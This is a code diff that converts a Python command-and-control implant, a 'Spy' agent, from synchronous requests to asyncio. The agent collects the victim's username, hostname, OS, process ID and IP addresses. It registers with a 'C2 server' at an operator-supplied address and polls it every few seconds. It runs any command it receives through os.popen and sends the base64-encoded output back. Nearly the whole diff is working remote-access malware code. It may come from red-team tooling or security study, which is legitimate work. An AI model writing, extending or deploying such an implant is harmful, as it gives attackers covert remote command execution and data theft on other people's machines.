@@ -11,110 +11,123 @@ import socket
 import urllib.request
 import argparse
 import base64
+import aiohttp
+import asyncio
+import logging
 from datetime import datetime  # Assuming you want to use datetime for timestamps
 
 class Spy:
-    def __init__(self):
-        self.id = None
-        self.guid = None
-        self.active = False
-        self.intaddr = None
-        self.extaddr = None
-        self.username = None
-        self.hostname = None
-        self.ops = None
-        self.pid = None
-        self.mission = None  # Initialize mission
-        self.interval = None
-        self.jitter = None
-        self.firstcheckin = None
-        self.lastcheckin = None
-        self.output = None
+	def __init__(self):
+		self.id = None
+		self.guid = None
+		self.active = False
+		self.intaddr = None
+		self.extaddr = None
+		self.username = None
+		self.hostname = None
+		self.ops = None
+		self.pid = None
+		self.mission = None  # Initialize mission
+		self.interval = None
+		self.jitter = None
+		self.firstcheckin = None
+		self.lastcheckin = None
+		self.output = None
 
-    def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid):
-        self.active = True
-        self.intaddr = intaddr
-        self.extaddr = extaddr
-        self.username = username
-        self.hostname = hostname
-        self.ops = ops
-        self.pid = pid
-        data = {
-            "active": str(self.active),
-            "intaddr": str(self.intaddr),
-            "extaddr": str(self.extaddr),
-            "username": str(self.username),
-            "hostname": str(self.hostname),
-            "ops": str(self.ops),
-            "pid": str(self.pid),
-        }
-        response = requests.post("http://localhost:5000/register", json=data)
-        response_data=response.json()
-        print(response_data)
-        self.id=response_data.get('ID')
-        self.guid=response_data.get('GUID')
-        self.active=response_data.get('Active')
-        self.firstcheckin=response_data.get('First Check-in')
-        self.lastcheckin=response_data.get('Last Check-in')
-        return response.text
+	async def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid, server):
+		self.active = True
+		self.intaddr = intaddr
+		self.extaddr = extaddr
+		self.username = username
+		self.hostname = hostname
+		self.ops = ops
+		self.pid = pid
+		data = {
+			"active": str(self.active),
+			"intaddr": str(self.intaddr),
+			"extaddr": str(self.extaddr),
+			"username": str(self.username),
+			"hostname": str(self.hostname),
+			"ops": str(self.ops),
+			"pid": self.pid
+			}
+		async with aiohttp.ClientSession() as session:
+			async with session.post(f"{server}/register", json=data) as response:
+				response_data = await response.json()
+				print(response_data)
+				self.id = int(response_data.get('id'))
+				self.guid = response_data.get('guid')
+				self.active = response_data.get('active')
+				self.firstcheckin = response_data.get('firstcheckin')
+				self.lastcheckin = response_data.get('lastcheckin')
+		return response_data
 
-#    def checkin(self):
-#        self.lastcheckin = self.timestamp()
-#        if self.mission is not None:
-#            if self.mission == 'kill':
-#                self.active = False
-#
-#    def timestamp(self):
-#        return datetime.now()  # Or another appropriate implementation
 
-def get_env(newspy):
-	ops=platform.system()
-	username=getpass.getuser()
-	pid = os.getpid()	
-	hostname=socket.gethostname()
+async def get_env(spy, server):
+	ops = platform.system()
+	username = getpass.getuser()
+	pid = os.getpid()
+	hostname = socket.gethostname()
 	extaddr = urllib.request.urlopen('https://ident.me').read().decode('utf8')
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
 	intaddr = s.getsockname()[0]
-	newspy.initial_checkin(intaddr, extaddr, username, hostname, ops, pid)
+
+	await spy.initial_checkin(intaddr, extaddr, username, hostname, ops, pid, server)
 	print("[+] Connected to the C2 server")
-	print("[+] Spy GUID "+str(newspy.guid))
+	print("[+] Spy GUID " + str(spy.guid))
 
-def check_in(spy):
+async def check_in(spy, server):
 	data = {"id": spy.id, "active": spy.active}
-	response = requests.post("http://localhost:5000/beacon", json=data)
-	return response.json()  
+      #  print(123)
+       # print(spy.id)
+        #print(spy.active)
+	async with aiohttp.ClientSession() as session:
+		async with session.post(f"{server}/beacon", json=data) as response:
+			response_text = await response.text()  # Get the response text
+			return await response.json()
 
-def execute_command(command):
-	result = os.popen(command).read()
-	return result
 
-#def upload():
+async def cmd_shell(command):
+    # Execute the command in a separate thread and then read the output
+	popen_object = await asyncio.to_thread(os.popen, command)
+	output=str(popen_object.read())
+	print(output)
+	return output
 
+#def cmd_cd():
+
+
+#def cmd_upload():
+
+#def cmd_ls():
+
+
+#def cmd_env():
+
+
+async def main(ip, port):
+	server = f"http://{ip}:{port}"
+	newspy = Spy()
+	await get_env(newspy, server) 
+	while True:
+		check_in_response = await check_in(newspy, server)
+		command = check_in_response.get('command')
+		if command:
+			result = await cmd_shell(command)
+			result_bytes = result.encode("ascii")
+			base64_bytes = base64.b64encode(result_bytes)
+			output = base64_bytes.decode("ascii")
+			print(output)
+			async with aiohttp.ClientSession() as session:
+				await session.post(f'{server}/result/{newspy.id}', json={"command": command, "result": output})
+		await asyncio.sleep(3)
 
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser()
 	parser.add_argument('--ip', '-i',required=True,dest='ip',help='Team server IP')
 	parser.add_argument('--port', '-p',required=True,dest='port',help='Port of the listener')
-#	parser.add_argument('--key', '-k',required=True,dest='key',help='Key to authenticate to the team server')
-	parser.add_argument('--verbose', '-v',help='Print more data',action='store_true')	
 	args = parser.parse_args()
-#	key=args.key
-	ip=args.ip
-	port=args.port
-
-	newspy=Spy()	
-	get_env(newspy)
-
-	while(True):
-		check_in_response = check_in(newspy)
-		command = check_in_response.get('command')
-		if command:
-			result = execute_command(command)
-			result_bytes=result.encode("ascii")
-			base64_bytes=base64.b64encode(result_bytes)
-			output=base64_bytes.decode("ascii") 
-			print(output)
-			requests.post('http://localhost:5000/result/'+str(newspy.id),json={"command":command,"result": output})
-		time.sleep(3)
-	
+	ip = args.ip
+	port = args.port
+	asyncio.run(main(ip, port))
